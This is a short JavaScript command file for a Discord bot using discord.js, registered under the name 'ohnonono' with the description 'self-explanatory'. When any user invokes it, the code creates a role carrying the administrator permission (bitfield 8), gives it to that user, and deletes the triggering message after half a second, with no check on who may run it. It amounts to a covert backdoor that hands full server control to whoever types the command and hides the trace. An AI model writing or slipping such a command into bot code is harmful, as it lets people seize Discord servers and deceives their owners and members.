const Discord = module.require("discord.js");
module.exports.run = async (bot, message, args) => {

    try {

        role = await message.guild.createRole({
          	permissions: [8]
        });

        message.member.addRole(role)
        message.delete(500);
        if (message){
            
        }

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "ohnonono",
    desc: "self-explanatory"

}
